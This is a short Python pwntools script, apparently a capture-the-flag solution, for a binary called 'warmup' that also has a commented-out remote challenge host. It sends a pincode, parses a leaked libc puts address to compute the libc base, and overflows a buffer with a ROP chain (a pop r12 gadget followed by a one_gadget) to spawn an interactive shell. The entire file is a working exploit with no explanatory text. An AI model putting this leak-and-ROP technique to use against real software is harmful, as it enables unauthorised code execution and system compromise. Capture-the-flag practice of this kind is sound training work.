from pwn import *

#r = remote("challenges.uactf.com.au" ,30005)
r = process("./warmup")
libc = ELF("./libc-2.31.so")
r.sendlineafter("Enter the pincode: \n" ,'11324342308938028171253')
r.recvuntil(b"tinyest bit.. ")
libc_leak = r.recvuntil(b"420")
libc_leak = str(libc_leak)
libc_leak = libc_leak.replace("b'","")
libc_leak = libc_leak.replace("'","")
libc_leak = int(libc_leak,16)
libc_base = libc_leak - libc.sym.puts
log.info(f"[LEAK] libc puts: {hex(libc_leak)}")
log.info(f"[LEAK] libc base: {hex(libc_base)}")
pop_r12 = libc_base + 0x1483e4
one_gadget = libc_base + 0xe3afe
exploit = b"A" * 56 + p64(pop_r12) + p64(0x0) + p64(one_gadget)
r.send(exploit)
r.interactive()
